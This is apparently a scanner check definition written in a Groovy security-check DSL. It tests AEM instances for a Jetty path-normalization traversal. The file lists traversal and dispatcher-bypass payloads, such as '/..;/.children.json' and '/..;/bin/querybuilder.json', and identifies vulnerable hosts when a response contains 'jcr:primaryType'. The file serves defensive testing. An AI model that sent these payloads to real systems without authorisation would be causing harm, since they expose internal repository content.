/*
 * (C) Copyright 2020 Netcentric - a Cognizant Digital Business
 *
 * All rights reserved. This program and the accompanying materials
 * are made available under the terms of the Eclipse Public License v1.0
 * which accompanies this distribution, and is available at
 * http://www.eclipse.org/legal/epl-v10.html
 */
import biz.netcentric.security.checkerdsl.dsl.securitycheck.HttpSecurityCheck
import biz.netcentric.security.checkerdsl.model.Severity
import biz.netcentric.security.checkerdsl.payload.FilterEvasion

HttpSecurityCheck.create{

    id "nc-Ow57Pirox"

    name "Path traversal vulnerability in jetty path normalization"

    vulnerability {
        name "Path traversal vulnerability: ${name}"
        description '''Path traversal vulnerability due to a flaw in path normalization handling for HTTP Path parameters in Jetty which comes prepackaged with AEM and takes effect there. 
            The token /..;/ a valid directory name in reverse proxies such as the dispatcher module while it means parent folder in jetty.
            Usually it requires another bypass to be effective.
        '''
        remediation "Block the pattern /..;/ via WAF, proxy  or dispatcher rule and harden dispatcher against other bypasses."
        cve "CWE-668"
        severity Severity.HIGH
    }

    categories 'dispatcher', 'jetty', 'traversal'

    steps([
            {
                name "GET to chain path traversal with dispatcher flaw"

                paths {
                }

                def selectors = ["/..;/.children.json", "/..;/.children.json/a.txt", "/..;/.children.json/c.css", "/jcr:content/;%0Aa.css/..;/..;/.children.json", "/..;/bin/querybuilder.json"]
                extensions FilterEvasion.DISPATCHER_BYPASS_EXTENSIONS.prefixBypasses(selectors)

                method "GET"

                detect {
                    all {
                        checkStatusCode 200
                        bodyContains "jcr:primaryType"
                    }
                }
            }
    ])
}